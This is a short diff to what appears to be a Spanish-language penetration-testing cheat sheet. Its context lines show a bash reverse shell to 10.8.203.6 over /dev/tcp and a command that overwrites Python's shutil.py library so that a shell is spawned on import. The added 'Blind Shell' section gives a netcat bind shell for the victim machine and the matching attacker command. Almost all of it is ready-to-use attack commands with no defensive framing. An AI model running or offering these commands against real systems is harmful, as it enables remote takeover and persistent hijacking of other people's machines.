@@ -28,3 +28,16 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.203.6/7890 0>&1'"):
 ```python
 echo "import os; os.system(\"bash -c 'bash -i >& /dev/tcp/10.8.203.6 0>&1'\")" > /usr/lib/python3.8/shutil.py
 ```
+
+### Blind Shell
+```python
+# Maquina Victima
+
+nc -nlvp 4646 -e /bin/bash
+---------------------------------------------------------------------------------------------------
+
+# Maquina Atacante
+
+nc IPvictima 4646
+
+```
